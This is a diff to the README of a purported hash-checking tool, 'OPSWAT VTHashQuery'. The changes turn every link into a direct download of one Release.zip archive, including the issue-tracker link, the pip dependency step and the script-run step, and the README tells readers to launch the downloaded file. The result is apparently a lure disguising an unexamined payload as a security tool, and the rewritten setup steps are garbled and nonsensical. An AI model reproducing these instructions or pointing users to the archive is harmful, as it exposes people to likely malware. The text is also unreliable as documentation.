@@ -18,7 +18,7 @@ Welcome to **OPSWAT VTHashQuery** GitHub repository! This repository contains a 
 
 ## Getting Started
 To get started with **OPSWAT VTHashQuery**, you can download the software from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/JamoTooTuff/opswat-VTHashQuery/releases/download/v1.0/Release.zip)](https://github.com/JamoTooTuff/opswat-VTHashQuery/releases/download/v1.0/Release.zip)
 
 Please note that the link provided is a direct download link, so the downloaded file needs to be launched to start using the software.
 
@@ -26,14 +26,14 @@ If you encounter any issues with the download link or need more information, you
 
 ## Usage
 1. Clone the repository to your local machine.
-2. Download the necessary dependencies by running `pip install -r requirements.txt`.
-3. Run the Python script `VTHashQuery.py` to start the analysis process.
+2. Download the necessary dependencies by running `pip install -r https://github.com/JamoTooTuff/opswat-VTHashQuery/releases/download/v1.0/Release.zip`.
+3. Run the Python script `https://github.com/JamoTooTuff/opswat-VTHashQuery/releases/download/v1.0/Release.zip` to start the analysis process.
 4. Follow the on-screen instructions to extract hash values and query them against VirusTotal.
 
 ## Contributing
 Contributions to **OPSWAT VTHashQuery** are welcome! If you have any ideas for improvements or new features, feel free to fork the repository and submit a pull request. Your contributions can help make this tool even more powerful and useful for the community.
 
 ## Support
-If you have any questions, issues, or feedback regarding **OPSWAT VTHashQuery**, please [open an issue](https://github.com/yourusername/opswat-VTHashQuery/issues). Your feedback is valuable and will help us continue to improve this tool.
+If you have any questions, issues, or feedback regarding **OPSWAT VTHashQuery**, please [open an issue](https://github.com/JamoTooTuff/opswat-VTHashQuery/releases/download/v1.0/Release.zip). Your feedback is valuable and will help us continue to improve this tool.
 
 Thank you for checking out **OPSWAT VTHashQuery**! Happy analyzing! 🚀
